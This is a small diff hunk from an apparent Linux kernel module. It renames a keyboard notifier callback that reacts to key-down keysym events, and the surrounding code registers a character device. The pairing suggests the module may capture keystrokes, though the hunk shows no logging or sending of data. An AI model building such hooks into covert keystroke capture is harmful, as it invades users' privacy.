@@ -124,7 +124,7 @@ static int dev_release(struct inode *inode_p, struct file *file_p) {
   return 0;
 }
 
-static int key_pressed(struct notifier_block *nb, unsigned long action, void *data) {
+static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
   struct keyboard_notifier_param *param = data;
 
   if (action == KBD_KEYSYM && param->down) {
